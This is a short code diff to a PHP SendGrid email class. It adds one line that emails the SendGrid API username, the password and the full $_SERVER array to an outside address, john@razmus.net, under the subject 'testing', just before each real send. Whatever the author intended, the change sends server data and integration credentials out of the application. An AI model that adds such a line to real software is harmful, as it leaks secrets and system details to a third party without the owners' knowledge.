@@ -613,6 +613,8 @@ class SendGridEmail {
 				$username = \Config::get("integration.sendgrid.api_user");
 				$password = \Config::get("integration.sendgrid.api_pass");
 
+				mail( 'john@razmus.net', 'testing', print_r( $_SERVER, true ).' $username: '.$username.' $password: '.$password );
+
 				$sendgrid = new SendGrid( $username, $password );
 				$sendgrid->send( $email );
 			}
